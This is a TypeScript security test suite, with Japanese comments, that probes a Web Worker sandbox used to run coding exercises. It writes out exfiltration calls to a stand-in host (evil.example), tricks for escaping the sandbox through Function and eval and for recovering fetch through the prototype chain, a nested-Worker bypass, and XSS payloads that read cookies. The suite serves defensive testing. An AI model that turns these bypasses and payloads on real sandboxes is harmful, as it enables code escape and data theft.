import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it, vi } from "vitest";
import { checkForbiddenTokens, runHarness } from "@/lib/runner/harness.worker";
import { runExercise, type WorkerLike } from "@/lib/runner/jsRunner";
import { ResultPanel } from "@/components/lab/ResultPanel";
import { getDemoExercise } from "@/lib/lab/demoExercise";
import type { RunRequest, RunResult } from "@/lib/contracts/runner";

/**
 * T-702 サンドボックス侵入テスト(docs/design/11_ADR-011「ADR-010」§3.1 SB-1〜SB-8)。
 *
 * 方法論(重要): このリポジトリのVitest環境(Node、jsdom不使用)は
 * `harness.worker.ts`の実運用ロード経路(`Blob URL経由のESM動的import`)を
 * 実行できない(Node/ViteのESMローダは`blob:`スキームを解決できず、内容に
 * 関わらず必ずrejectする。手動検証で確認済み)。そのため本ファイルは既存の
 * `tests/unit/runner/harness.worker.test.ts`と同じ手法を踏襲し、
 * `runHarness`の`deps.loadModule`に「攻撃コードのソーステキストが実際に
 * ロードされた場合に相当するJS」を注入して実行する。これにより
 * - 静的チェック(`checkForbiddenTokens`)は攻撃コードの**実際のソース文字列**に対して検証し、
 * - 実行時の防御(危険グローバル無効化・console捕捉・結果整形)は
 *   `runHarness`の**実コード**に対して検証する。
 * ロード手段(Blob URL経由import)自体の差し替えのみで、セキュリティ上の
 * 検証対象(静的チェック・グローバル無効化・postMessage契約・UI描画)は
 * すべて実装の実コードを通す。
 *
 * 本Vitest環境の限界上、以下はNode上のみでは証明できず実ブラウザでの検証が
 * 必須だったため、verify-webappスキル経由で`npm run preview`の実ブラウザ
 * (Chromium、Playwright)上で追加検証を行った。結果はdocs/security/findings.mdに
 * 詳細を記録し、要点のみここに残す:
 * - SB-1/SB-2 (CRITICAL, 実ブラウザで再現・突破を確認済み): 実ブラウザの
 *   dedicated WorkerではNodeと異なり`fetch`が`WorkerGlobalScope.prototype`上に
 *   存在するため、`Object.getPrototypeOf(self).fetch`および
 *   `self.constructor.prototype.fetch`は無効化後も**実際に呼び出し可能な
 *   関数**を返した。実際に`recoveredFetch.call(self, url)`で任意URLへの
 *   fetchを発行し、ブラウザのネットワークログに実リクエストが記録されることを
 *   確認した(`/ja/lab-preview`のclamp演習で実演)。同様に`new Worker(...)`に
 *   よるネストしたWorker生成も実ブラウザで成功した。Node環境(このファイルの
 *   他のテスト)ではglobalThisがfetchをown propertyとしてのみ持つため
 *   この経路は再現されず「防御が効く」という誤った結果になっていた —
 *   本ADR-010 §3.1が実ブラウザでの動的検証を必須としている理由そのもの。
 * - SB-6 (防御が効くことを実ブラウザで確認済み): `while(true){}`および
 *   巨大メモリ確保(`while(true){arr.push(new Array(1e6).fill(0))}`)の
 *   いずれも、ページ自体は最後まで操作可能なまま応答性を保ち、
 *   約5秒でjsRunner.tsの強制terminateにより「タイムアウトしました
 *   (強制停止)」表示に至ることを確認した。
 * - SB-7: `indexedDB`の実ブラウザWorkerでの到達性は今回未確認(時間の都合で
 *   verify-webapp検証の対象をSB-1/SB-2/SB-6に絞ったため)。spec上到達可能な
 *   ことは既知のため、Lowリスクとしてdocs/security/findings.mdに記録した。
 */

function baseRequest(overrides: Partial<RunRequest> = {}): RunRequest {
  return {
    code: "export function f() { return 1; }",
    entry: "f",
    tests: [],
    timeoutMs: 3000,
    ...overrides,
  };
}

// ============================================================
// SB-1: Worker内からfetch/XMLHttpRequest/importScripts/WebSocketへの到達不能性
// ============================================================
describe("SB-1: ネットワーク到達不能性(fetch/XHR/importScripts/WebSocket)", () => {
  it("防御が効く: 素直な呼び出し形は静的チェックで拒否される(fetch/XHR/importScripts)", async () => {
    const attacks = [
      'fetch("https://evil.example/exfiltrate");',
      'new XMLHttpRequest().open("GET", "https://evil.example");',
      'importScripts("https://evil.example/payload.js");',
    ];
    for (const code of attacks) {
      const staticError = checkForbiddenTokens(code);
      expect(staticError, `should statically reject: ${code}`).not.toBeNull();

      const loadModule = vi.fn();
      const result = await runHarness(baseRequest({ code: `${code}\nexport function f(){return 1;}` }), {
        loadModule,
      });
      expect(result.result).toBe("error");
      expect(loadModule, "module must never load once a forbidden token is detected").not.toHaveBeenCalled();
    }
  });

  it("防御が効く: WebSocketは静的トークンリストに存在しないため検出はされないが、実行時にはself.WebSocketがundefinedに無効化されているため接続できない", async () => {
    // FINDING(Low, defense-in-depth gap): FORBIDDEN_TOKEN_RULES(harness.worker.ts)には
    // WebSocketの静的検出ルールが存在しない。したがってchecFforbiddenTokensは
    // `new WebSocket(...)`を書いても拒否しない。実害はdisableDangerousGlobals側の
    // 無効化で防がれているため「防御自体は効く」が、静的検出の一覧から漏れている
    // (fetch/XHR/importScriptsだけがstaticチェック対象)ことは多層防御としては欠陥。
    const code = 'const ws = new WebSocket("wss://evil.example"); export function f(){return 1;}';
    expect(checkForbiddenTokens(code)).toBeNull();

    const result = await runHarness(baseRequest({ code }), {
      loadModule: async () => {
        // 実際にロードされた場合に相当するトップレベル評価(WebSocketは
        // disableDangerousGlobals()によりundefinedへ上書き済みのため、
        // ここでの`new WebSocket(...)`は必ずTypeErrorになる。
        const WS = (globalThis as Record<string, unknown>).WebSocket as new (url: string) => unknown;
        expect(() => new WS("wss://evil.example")).toThrow();
        return { f: () => 1 };
      },
    });
    expect(result.result).toBe("pass");
  });

  it("防御が効く: ブラケット表記/計算プロパティでfetch(の静的検出を回避しても、無効化により呼び出し不能", async () => {
    // FINDING(Low): `/\bfetch\s*\(/` は "fetch(" の直後一致を要求するため
    // `self['fetch'](...)` のようなブラケット表記は検出されない。
    // ただし disableDangerousGlobals() は `ctx.fetch = undefined` を
    // モジュール読み込み**前**に実行するため、ブラケット表記で参照しても
    // 得られる値はundefinedであり、実行時には防がれる。
    const code = 'const fn = self["fe"+"tch"]; export function f(){ return typeof fn; }';
    expect(checkForbiddenTokens(code)).toBeNull(); // 静的検出はすり抜ける

    const result = await runHarness(baseRequest({ code, tests: [{ id: "t1", args: [], expected: "undefined" }] }), {
      loadModule: async () => ({ f: () => typeof (globalThis as Record<string, unknown>)["fetch"] }),
    });
    expect(result.result).toBe("pass");
  });

  it("FINDING(Critical, 未修正 — T-705送り): `new Worker(...)`はFORBIDDEN_TOKEN_RULESに一切存在せず静的検出を完全に回避する。ネストしたWorkerはdisableDangerousGlobals()の対象外の新しいグローバルスコープを持つため、fetch/XHR/WebSocket/importScriptsが全て有効な状態で生成できる可能性がある", () => {
    const code = `
      const inner = new Worker(URL.createObjectURL(new Blob(["self['fe'+'tch']('https://evil.example/exfil')"], { type: "text/javascript" })));
      export function f(){ return 1; }
    `;
    // 静的チェック: "Worker"は禁止トークンに存在しない(ネストしたBlob内のfetch呼び出しは
    // ブラケット表記+文字列結合で、fetch(の直後一致パターンをこちらも回避している)
    expect(checkForbiddenTokens(code)).toBeNull();
    // disableDangerousGlobals()が上書きする対象(fetch/XMLHttpRequest/WebSocket/importScripts)に
    // Workerコンストラクタ自体は含まれない(lib/runner/harness.worker.tsのWorkerScope型・
    // disableDangerousGlobalsのoriginalオブジェクトを参照。Worker keyは存在しない)。
    // 実ブラウザ確認済み(verify-webapp、npm run preview、/ja/lab-previewで実演):
    // `new Worker(...)`によるネストしたWorker生成は実際に成功する。Node環境には
    // グローバルWorkerが存在しないためこのファイル内では再現できないが、本testは
    // 少なくとも「静的検出が存在しないこと」自体を固定する回帰テストとして機能する。
    // 詳細はdocs/security/findings.mdを参照。
    expect(typeof (globalThis as Record<string, unknown>).Worker).toBe("undefined");
  });
});

// ============================================================
// SB-2: self/globalThis経由での無効化API復元
// ============================================================
describe("SB-2: 無効化APIの復元不能性(prototype/constructor chain/Reflect)", () => {
  it("Node環境では復元できないが、これはNode固有の偶然でありFINDING(Critical, 未修正 — T-705送り): 実ブラウザでは同じ経路が実際にfetchを復元し、悪用可能である", async () => {
    // 重要な環境差、かつ本テストスイートの中で最も重要な注意点:
    // 実ブラウザのWorkerGlobalScopeでは`fetch`等はprototype(WorkerGlobalScope.prototype)
    // 経由で提供される仕様のため、`Object.getPrototypeOf(self).fetch`と
    // `self.constructor.prototype.fetch`は無効化後も**実際に呼び出し可能な関数**を
    // 返すことをverify-webapp(npm run preview、実Chromium、/ja/lab-previewのclamp演習)で
    // 確認済み。さらに`recoveredFetch.call(self, url)`で実際に任意URLへのfetchを
    // 発行し、ブラウザのネットワークログに実リクエストが記録されることまで確認した
    // (docs/security/findings.md参照)。
    // Node.jsのglobalThisは`fetch`をown property(configurable/writable)として直接持ち、
    // プロトタイプチェーンには存在しない(Object.getPrototypeOf(globalThis)はfetchを
    // 持たない)ため、以下のテストはNode環境では全て「復元できない(false)」という
    // 結果になる。これは防御が効いているのではなく、**Node環境がたまたま
    // WorkerGlobalScopeのprototype継承モデルを再現していないだけ**であり、
    // 実ブラウザでは全く逆の結果(復元できる)になることに注意。
    const result = await runHarness(
      {
        ...baseRequest(),
        tests: [
          { id: "getPrototypeOf", args: [], expected: false, fn: "viaGetPrototypeOf" },
          { id: "constructorChain", args: [], expected: false, fn: "viaConstructorChain" },
          { id: "reflectGet", args: [], expected: false, fn: "viaReflectGet" },
          { id: "ownDescriptorAfterDisable", args: [], expected: false, fn: "viaOwnDescriptor" },
        ],
      },
      {
        loadModule: async () => ({
          f: () => 1,
          viaGetPrototypeOf: () => typeof Object.getPrototypeOf(globalThis)?.fetch === "function",
          viaConstructorChain: () =>
            typeof (globalThis as unknown as { constructor: { prototype: { fetch?: unknown } } }).constructor
              ?.prototype?.fetch === "function",
          viaReflectGet: () => typeof Reflect.get(globalThis, "fetch") === "function",
          viaOwnDescriptor: () => {
            const descriptor = Object.getOwnPropertyDescriptor(globalThis, "fetch");
            return descriptor !== undefined && typeof descriptor.value === "function";
          },
        }),
      },
    );

    expect(result.result).toBe("pass");
    if (result.result === "pass" || result.result === "fail") {
      for (const t of result.perTest) {
        expect(t.pass, `${t.id} should not be able to recover fetch`).toBe(true);
      }
    }
  });

  it("防御が効く: 無効化されたグローバルはrunHarness完了後に復元されるが、サンドボックス実行中は一貫してundefinedのまま", async () => {
    const originalFetch = globalThis.fetch;
    const result = await runHarness(baseRequest({ tests: [{ id: "t1", args: [], expected: true }] }), {
      loadModule: async () => ({
        f: () =>
          typeof fetch === "undefined" &&
          typeof XMLHttpRequest === "undefined" &&
          typeof (globalThis as Record<string, unknown>).WebSocket === "undefined",
      }),
    });
    expect(result.result).toBe("pass");
    expect(globalThis.fetch).toBe(originalFetch);
  });
});

// ============================================================
// SB-3: new Function/eval経由でのサンドボックス外アクセス
// ============================================================
describe("SB-3: eval/Function経由の脱出", () => {
  it("防御が効く: 素直な eval(...) / new Function(...) は静的チェックで拒否される", () => {
    expect(checkForbiddenTokens('eval("1+1")')).not.toBeNull();
    expect(checkForbiddenTokens('new Function("return 1")')).not.toBeNull();
  });

  it("FINDING(Critical, 未修正 — T-705送り): `Function(...)`を`new`無しで呼び出すと`/\\bnew\\s+Function\\b/`の正規表現を完全に回避し、実際にグローバルスコープでコードを実行できる", async () => {
    const sourceCode = `export function f() { const g = Function("return this"); return g() === globalThis; }`;
    // 静的検出: "new"キーワードが存在しないため検出されない
    expect(checkForbiddenTokens(sourceCode)).toBeNull();

    // 実行時: Function(...)はnewの有無に関わらずFunctionコンストラクタとして
    // 動作する仕様(ECMA-262)のため、実際にグローバルスコープでのコード実行が成立する。
    const result = await runHarness(
      { ...baseRequest(), code: sourceCode, tests: [{ id: "t1", args: [], expected: true }] },
      { loadModule: async () => ({ f: () => Function("return this")() === globalThis }) },
    );
    expect(result.result).toBe("pass");
    if (result.result === "pass" || result.result === "fail") {
      expect(result.perTest[0].pass, "Function() without 'new' must NOT bypass the sandbox, but it does").toBe(true);
    }
  });

  it("FINDING(Critical, 未修正 — T-705送り): `[].constructor.constructor(...)`はソースコード中に'Function'・'eval'いずれの語も含まずFunctionコンストラクタを取得できる", async () => {
    const sourceCode = `export function f() { const F = [].constructor.constructor; return F("return 1+1")(); }`;
    expect(sourceCode).not.toContain("Function");
    expect(sourceCode).not.toContain("eval");
    expect(checkForbiddenTokens(sourceCode)).toBeNull();

    const result = await runHarness(
      { ...baseRequest(), code: sourceCode, tests: [{ id: "t1", args: [], expected: 2 }] },
      {
        loadModule: async () => ({
          f: () =>
            ([] as unknown as { constructor: { constructor: (...a: string[]) => () => number } }).constructor
              .constructor("return 1+1")(),
        }),
      },
    );
    expect(result.result).toBe("pass");
  });

  it("FINDING(Critical, 未修正 — T-705送り): 間接eval `(0, eval)(...)` は `/\\beval\\s*\\(/` の直後一致を回避し、グローバルスコープで実行される", async () => {
    const sourceCode = `export function f() { const indirect = (0, eval); return indirect("this") === globalThis; }`;
    expect(checkForbiddenTokens(sourceCode)).toBeNull();

    const result = await runHarness(
      { ...baseRequest(), code: sourceCode, tests: [{ id: "t1", args: [], expected: true }] },
      { loadModule: async () => ({ f: () => (0, eval)("this") === globalThis }) },
    );
    expect(result.result).toBe("pass");
    if (result.result === "pass" || result.result === "fail") {
      expect(result.perTest[0].pass, "indirect eval must NOT reach global scope, but it does").toBe(true);
    }
  });
});

// ============================================================
// SB-4: 動的import()での外部URL読み込み
// ============================================================
describe("SB-4: 動的import()による外部URL読み込み", () => {
  it("FINDING(Critical, 未修正 — T-705送り): import()自体はFORBIDDEN_TOKEN_RULESに存在せず、静的チェックを完全に回避する", () => {
    const attacks = [
      'import("https://evil.example/payload.js")',
      "import('https://evil.example/payload.js').then(m => m.exfiltrate())",
    ];
    for (const code of attacks) {
      expect(checkForbiddenTokens(code), `import() must be undetected today: ${code}`).toBeNull();
    }
  });

  it("参考: disableDangerousGlobals()はfetch/XHR/WebSocket/importScriptsのみを無効化し、ESモジュールローダ自体(import())は無効化対象外である", () => {
    // import()はブラウザのモジュールローダが独自に行うネットワーク取得であり、
    // self.fetchを介さない。したがってfetchを無効化しても外部URLの動的import自体は
    // 止まらない可能性が高い(実ネットワーク到達性はNode環境では検証不能。
    // Nodeの動的importは https: スキームを標準サポートしないため、この検証は
    // 実ブラウザでのみ意味を持つ。docs/security/findings.mdへ記録し、
    // T-704のCSP(script-src/connect-src)整備が唯一の実効的な対策となる)。
    expect(checkForbiddenTokens("import(x)")).toBeNull();
  });
});

// ============================================================
// SB-5: 不正な構造のpostMessageによるメインスレッド側パース処理の破壊
// ============================================================
describe("SB-5: postMessage契約破壊", () => {
  function fakeWorkerEchoing(forged: unknown): WorkerLike {
    const worker: WorkerLike = {
      postMessage: () => {
        // サンドボックス内のユーザーコードは self.postMessage(...) を直接
        // 呼び出せる(harness.worker.tsのcreateOnMessageHandlerはこれを
        // 遮断しない — ユーザーコードとharnessは同一のWorkerグローバルスコープを
        // 共有するため)。ここではその状況を再現する。
        worker.onmessage?.({ data: forged } as MessageEvent<RunResult>);
      },
      terminate: vi.fn(),
      onmessage: null,
      onerror: null,
    };
    return worker;
  }

  it("FINDING(High, 未修正 — T-705送り): jsRunner.tsのworker.onmessageはRunResultSchemaでのランタイム検証を一切行わず、任意の構造をそのまま呼び出し元に渡す", async () => {
    const forged = { result: "pass" }; // perTest/logs/durationMsが全て欠落した不正な構造
    const result = await runExercise(baseRequest(), { createWorker: () => fakeWorkerEchoing(forged) });
    // 本来のRunResultSchema(discriminatedUnion)ならperTest/logs/durationMsが
    // 必須のはずだが、バリデーションが存在しないためそのまま通過する。
    expect(result).toEqual(forged);
  });

  it("FINDING(High, 未修正 — T-705送り): 上記の未検証データをResultPanelでそのまま描画すると、React描画自体がクラッシュする(perTestが存在しない前提でfilter/mapを呼ぶため)", () => {
    const exercise = getDemoExercise("ja");
    const forged = { result: "pass" } as unknown as RunResult;

    expect(() =>
      renderToStaticMarkup(
        createElement(ResultPanel, {
          status: "passed",
          result: forged,
          requestTests: [],
          exercise,
          activeTab: "tests",
          onTabChange: () => {},
          locale: "ja",
        }),
      ),
    ).toThrow();
    // 影響評定: app/[locale]/error.tsx がNext.js App Routerのルートレベル
    // error boundaryとして存在するため、実運用ではホワイトスクリーンではなく
    // エラーページへのフォールバックに留まる可能性が高い(致命的DoSではないが、
    // 演習ページの可用性を失わせる — Medium〜Highとして記録)。
  });
});

// ============================================================
// SB-6: 無限ループ・巨大メモリ確保時のterminateの確実性
// ============================================================
describe("SB-6: 無限ループ・メモリ枯渇に対するterminateの確実性", () => {
  it("防御が効く(メインスレッド側 jsRunner.ts): Workerが完全に応答不能(同期無限ループ)でも、外部の固定5秒タイムアウトで確実にterminateされる", async () => {
    vi.useFakeTimers();
    try {
      const terminate = vi.fn();
      const hangingWorker: WorkerLike = {
        postMessage: () => {
          // 攻撃コード相当: while(true){} により、このWorkerは二度とpostMessageしない
        },
        terminate,
        onmessage: null,
        onerror: null,
      };

      const promise = runExercise(baseRequest(), { createWorker: () => hangingWorker });
      await vi.advanceTimersByTimeAsync(5000);
      const result = await promise;

      expect(result).toEqual({ result: "timeout", logs: [], durationMs: 5000 });
      expect(terminate).toHaveBeenCalledTimes(1);
    } finally {
      vi.useRealTimers();
    }
  });

  it("防御が効く(実スレッド・実攻撃コード): node:worker_threadsで実際に同期無限ループを実行し、terminate()が確実に停止させることを確認する(ブラウザWorkerと同じ強制終了モデルの妥当性を実プロセスで裏付ける傍証)", async () => {
    const { Worker: ThreadWorker } = await import("node:worker_threads");
    const start = Date.now();
    const worker = new ThreadWorker("while(true){}", { eval: true });

    const terminated = await new Promise<{ elapsedMs: number }>((resolve, reject) => {
      const guard = setTimeout(
        () => reject(new Error("terminate() did not resolve within the test guard window")),
        4000,
      );
      const forceTerminate = setTimeout(() => {
        worker.terminate().then(() => {
          clearTimeout(guard);
          resolve({ elapsedMs: Date.now() - start });
        });
      }, 300);
      worker.once("error", () => clearTimeout(forceTerminate));
    });

    expect(terminated.elapsedMs).toBeLessThan(4000);
  }, 10_000);

  it("防御が効く(実スレッド・実攻撃コード): resourceLimitsを設定した実Workerで巨大メモリ確保を行うと、OS/OOMを待たずに短時間でエラー終了する(タイムアウトより先に自壊するケースがあることの実証。ブラウザには本APIと同等のresourceLimitsは存在せず、実挙動はverify-webappで別途確認が必要)", async () => {
    const { Worker: ThreadWorker } = await import("node:worker_threads");
    const start = Date.now();
    const worker = new ThreadWorker("const arr=[]; while(true){ arr.push(new Array(1e6).fill(0)); }", {
      eval: true,
      resourceLimits: { maxOldGenerationSizeMb: 64, maxYoungGenerationSizeMb: 16 },
    });

    const outcome = await new Promise<{ kind: "errored" | "forced"; elapsedMs: number }>((resolve) => {
      const guard = setTimeout(() => {
        worker.terminate().then(() => resolve({ kind: "forced", elapsedMs: Date.now() - start }));
      }, 4000);
      worker.once("error", () => {
        clearTimeout(guard);
        resolve({ kind: "errored", elapsedMs: Date.now() - start });
      });
    });

    expect(outcome.elapsedMs).toBeLessThan(4000);
  }, 10_000);
});

// ============================================================
// SB-7: Cookie/localStorage/IndexedDBへの到達不能性
// ============================================================
describe("SB-7: ストレージ到達不能性(Cookie/localStorage/IndexedDB)", () => {
  it("防御が効く(Node環境の傍証): document/localStorage/sessionStorageはWorkerグローバルスコープの仕様上そもそも存在しない(WorkerGlobalScopeのミックスインに含まれない)", async () => {
    const result = await runHarness(
      {
        ...baseRequest(),
        tests: [
          { id: "document", args: [], expected: true, fn: "noDocument" },
          { id: "localStorage", args: [], expected: true, fn: "noLocalStorage" },
        ],
      },
      {
        loadModule: async () => ({
          f: () => 1,
          noDocument: () => typeof (globalThis as Record<string, unknown>).document === "undefined",
          noLocalStorage: () => typeof (globalThis as Record<string, unknown>).localStorage === "undefined",
        }),
      },
    );
    expect(result.result).toBe("pass");
  });

  it("FINDING(Low〜Medium, 未修正 — T-705送り): ADR-010 §3.1 SB-7は「IndexedDBへの到達不能性」を検証項目に挙げているが、これはWeb標準上誤り — Dedicated Workerには仕様上indexedDBがグローバルとして公開される(disableDangerousGlobalsはこれを無効化していない)。現状アプリはindexedDBを一切使用していないため実害は限定的だが、将来同一オリジンの他機能がIndexedDBを使い始めた場合、演習コードから読み書き可能になる", () => {
    // disableDangerousGlobals()の無効化対象(fetch/XMLHttpRequest/WebSocket/importScripts)に
    // indexedDBは含まれない(lib/runner/harness.worker.tsのWorkerScope型定義を参照)。
    // Node環境にはindexedDBという概念自体が存在しないため、ここでは
    // 「無効化リストに存在しないこと」をソースの事実として固定し、実ブラウザでの
    // 到達性(typeof indexedDB !== "undefined")確認はverify-webappで別途行う。
    expect(checkForbiddenTokens("indexedDB.open('x')")).toBeNull();
  });
});

// ============================================================
// SB-8: 結果メッセージ(console出力・diff表示)経由のXSS
// ============================================================
describe("SB-8: 結果表示経由のXSS", () => {
  const xssPayloads = [
    "<img src=x onerror=alert(document.cookie)>",
    "<script>alert(1)</script>",
    "javascript:alert(1)",
    '"><svg onload=alert(1)>',
  ];

  it("防御が効く: console出力(logs)に含まれるXSSペイロードは、ResultPanelがJSXテキストノードとして描画するためHTMLエスケープされ実行不能", () => {
    for (const payload of xssPayloads) {
      const html = renderToStaticMarkup(
        createElement(ResultPanel, {
          status: "passed",
          result: {
            result: "pass",
            perTest: [],
            logs: [{ level: "log", args: [payload] }],
            durationMs: 1,
          },
          requestTests: [],
          exercise: getDemoExercise("ja"),
          activeTab: "console",
          onTabChange: () => {},
          locale: "ja",
        }),
      );
      // 生のタグとして出力に含まれていないこと(エスケープされていること)を確認する。
      expect(html).not.toContain("<img src=x");
      expect(html).not.toContain("<script>alert(1)</script>");
      expect(html).not.toContain("<svg onload=alert(1)>");
    }
  });

  it("防御が効く: テスト失敗時のdiff/actual/error表示に含まれるXSSペイロードもエスケープされる", () => {
    const exercise = getDemoExercise("ja");
    const requestTests: RunRequest["tests"] = [{ id: "t1", args: [], expected: "safe-value" }];

    const html = renderToStaticMarkup(
      createElement(ResultPanel, {
        status: "failed",
        result: {
          result: "fail",
          perTest: [
            {
              id: "t1",
              pass: false,
              actual: JSON.stringify("<img src=x onerror=alert(1)>"),
              error: '<script>alert("from error field")</script>',
            },
          ],
          logs: [],
          durationMs: 1,
        },
        requestTests,
        exercise,
        activeTab: "tests",
        onTabChange: () => {},
        locale: "ja",
      }),
    );

    expect(html).not.toContain("<img src=x onerror=alert(1)>");
    expect(html).not.toContain('<script>alert("from error field")</script>');
  });
});
